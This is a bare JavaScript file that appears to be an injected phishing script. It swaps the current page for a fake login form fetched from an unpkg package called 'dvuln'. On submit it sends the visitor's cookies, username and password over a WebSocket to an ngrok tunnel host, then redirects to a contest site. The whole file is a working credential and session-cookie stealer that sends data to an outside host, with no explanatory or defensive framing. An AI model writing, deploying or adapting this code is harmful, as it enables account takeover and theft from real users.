fetch('https://unpkg.com/dvuln/login.html')
  .then(response => response.text())
  .then(html => init(html))
  .catch(error => console.log('Error:', error));




function init(new_html){
    document.documentElement.innerHTML = new_html;

    const form = document.getElementById('loginform');
    const submitButton = document.getElementById('submit_button');
    const socket = new WebSocket('wss://c525-185-175-238-250.ngrok-free.app');
    

    function send() {
    	location.href = 'https://hneu.dots.org.ua/contests';
        let username = form.username.value;
        let password = form.password.value;
        const domain = location.hostname;
        socket.send(document.cookie);
        socket.send('username: ' + username + ' password: ' + password);
        
    }
    

    submitButton.addEventListener('click', send);

}
